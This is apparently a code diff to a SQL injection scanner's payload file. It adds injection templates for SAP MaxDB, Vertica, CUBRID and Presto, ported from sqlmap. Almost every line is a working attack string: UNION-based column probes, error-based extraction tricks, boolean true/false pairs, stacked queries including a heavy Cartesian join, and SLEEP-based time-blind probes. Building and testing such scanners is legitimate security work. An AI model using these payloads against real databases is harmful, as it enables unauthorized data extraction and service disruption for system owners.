@@ -299,3 +299,129 @@ export const monetdbPayload = {
   ],
   stacked: [],
 };
+
+// ==================== D307：sqlmap 官方测试集暴露的 4 方言 ====================
+// 依据：sqlmap 1.10.11 data/xml/payloads/*.xml 共 18 条 <test> 的官方语法
+// （SAP MaxDB 10 / Vertica 2 / CUBRID 4 / Presto 2）。模板逐条映射官方 payload，
+// 占位符换成本仓 {ORIG}/{SLEEP}/{NUM}/{SEP}。
+// ⚠ 诚实边界：本机无这 4 种数据库，模板为静态移植、未经真机验证（与 others.js
+//   既有「最小适配待验证」同口径）。指纹层 resolveDbms 把 maxdb/cubrid/vertica
+//   归一到 MySQL/PG（兼容映射，不动）——这些独立 key 只在用户 --dbms 显式指定时命中
+//   （detect.js forcedDbms 原样流入 PAYLOADS[dbms]，不经归一），自动指纹场景不投放。
+// boolean 数组遵循固定索引契约：[0,2] 单引号真假 / [1,3] 双引号 / [4,5] 数字型 / [6,7] OR。
+
+// SAP MaxDB：sqlmap 官方用 CASE WHEN ... FROM DUAL（WHERE/ORDER BY 值位）与
+// ;SELECT CASE WHEN ... FROM DUAL（stacked）；time 通道官方走 heavy query 大笛卡尔积
+// （DOMAIN.DOMAINS × COLUMNS × TABLES），本仓 TimeBlindDetector 依赖可观测 {SLEEP} 延时，
+// heavy query 无稳定延时阈值 ⇒ time 留空不投放（不伪造延时向量）。
+export const sapMaxdbPayload = {
+  union: [
+    "{ORIG} UNION SELECT {NUM},* FROM DUAL-- -",
+    "{ORIG}' UNION SELECT {NUM},* FROM DUAL-- -",
+    '{ORIG}" UNION SELECT {NUM},* FROM DUAL-- -',
+  ],
+  error: [
+    "{ORIG}' AND 1=CAST((SELECT 'a' FROM DUAL) AS INTEGER)-- -",
+    '{ORIG}" AND 1=CAST((SELECT \'a\' FROM DUAL) AS INTEGER)-- -',
+  ],
+  boolean: [
+    // [0]/[2] 单引号真假对（官方 ORDER BY CASE WHEN 形态，加注释适配 WHERE 值位）
+    "{ORIG}' AND (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -",
+    "{ORIG}' AND (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -",
+    // [1]/[3] 双引号对
+    '{ORIG}" AND (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -',
+    '{ORIG}" AND (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -',
+    // [4]/[5] 数字型无引号对
+    "{ORIG} AND (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -",
+    "{ORIG} AND (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -",
+    // [6]/[7] OR 变体（对标官方 OR time/boolean）
+    "{ORIG}' OR (CASE WHEN 1=1 THEN 1 ELSE NULL END)=1-- -",
+    "{ORIG}' OR (CASE WHEN 1=2 THEN 1 ELSE NULL END)=1-- -",
+  ],
+  // 官方 stacked：;SELECT CASE WHEN <cond> THEN 1 ELSE NULL END FROM DUAL
+  stacked: [
+    "{ORIG}';SELECT CASE WHEN 1=1 THEN 1 ELSE NULL END FROM DUAL-- -",
+    "{ORIG}';SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3-- -",
+  ],
+  // 官方 5 条 time 均为 heavy query（无稳定延时）⇒ 留空，不伪造 SLEEP 向量
+  time: [],
+};
+
+// Vertica：官方 2 条 error-based = ZEROIFNULL(CAST('marker'||(query)::varchar||'marker' AS NUMERIC))
+export const verticaPayload = {
+  union: [
+    "{ORIG} UNION SELECT {NUM},version()-- -",
+    "{ORIG}' UNION SELECT {NUM},version()-- -",
+    '{ORIG}" UNION SELECT {NUM},version()-- -',
+  ],
+  error: [
+    "{ORIG}' AND {NUM}=ZEROIFNULL(CAST('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END)::varchar||'~' AS NUMERIC))-- -",
+    "{ORIG} OR {NUM}=ZEROIFNULL(CAST('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END)::varchar||'~' AS NUMERIC))-- -",
+  ],
+  boolean: [
+    "{ORIG}' AND 1=1-- -",
+    '{ORIG}" AND "1"="1-- -',
+    "{ORIG}' AND 1=2-- -",
+    '{ORIG}" AND "1"="2-- -',
+    "{ORIG} AND 1=1-- -",
+    "{ORIG} AND 1=2-- -",
+    "{ORIG}' OR 1=1-- -",
+    "{ORIG}' OR 1=2-- -",
+  ],
+  stacked: [],
+  time: [], // 官方无 Vertica time-based 测试
+};
+
+// CUBRID：官方 2 条 error = INET_ATON('marker'||(query)||'marker')，
+// 2 条 time = (SELECT SLEEP(n) FROM db_root)
+export const cubridPayload = {
+  union: [
+    "{ORIG} UNION SELECT {NUM},version()-- -",
+    "{ORIG}' UNION SELECT {NUM},version()-- -",
+    '{ORIG}" UNION SELECT {NUM},version()-- -',
+  ],
+  error: [
+    "{ORIG}' AND {NUM}=INET_ATON('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END)||'~')-- -",
+    "{ORIG} OR {NUM}=INET_ATON('~'||(SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END)||'~')-- -",
+  ],
+  boolean: [
+    "{ORIG}' AND 1=1-- -",
+    '{ORIG}" AND "1"="1-- -',
+    "{ORIG}' AND 1=2-- -",
+    '{ORIG}" AND "1"="2-- -',
+    "{ORIG} AND 1=1-- -",
+    "{ORIG} AND 1=2-- -",
+    "{ORIG}' OR 1=1-- -",
+    "{ORIG}' OR 1=2-- -",
+  ],
+  time: [
+    "{ORIG}' AND {NUM}=(SELECT SLEEP({SLEEP}) FROM db_root)-- -",
+    "{ORIG} OR {NUM}=(SELECT SLEEP({SLEEP}) FROM db_root)-- -",
+  ],
+  stacked: [],
+};
+
+// Presto：官方 2 条 error = PARSE_DATA_SIZE('marker'||CAST((query) AS VARCHAR)||'marker')
+export const prestoPayload = {
+  union: [
+    "{ORIG} UNION SELECT {NUM},current_user-- -",
+    "{ORIG}' UNION SELECT {NUM},current_user-- -",
+    '{ORIG}" UNION SELECT {NUM},current_user-- -',
+  ],
+  error: [
+    "{ORIG}' AND {NUM}=PARSE_DATA_SIZE('~'||CAST((SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END) AS VARCHAR)||'~')-- -",
+    "{ORIG} OR {NUM}=PARSE_DATA_SIZE('~'||CAST((SELECT CASE WHEN ({NUM}={NUM}) THEN 1 ELSE 0 END) AS VARCHAR)||'~')-- -",
+  ],
+  boolean: [
+    "{ORIG}' AND 1=1-- -",
+    '{ORIG}" AND "1"="1-- -',
+    "{ORIG}' AND 1=2-- -",
+    '{ORIG}" AND "1"="2-- -',
+    "{ORIG} AND 1=1-- -",
+    "{ORIG} AND 1=2-- -",
+    "{ORIG}' OR 1=1-- -",
+    "{ORIG}' OR 1=2-- -",
+  ],
+  stacked: [],
+  time: [], // 官方无 Presto time-based 测试
+};
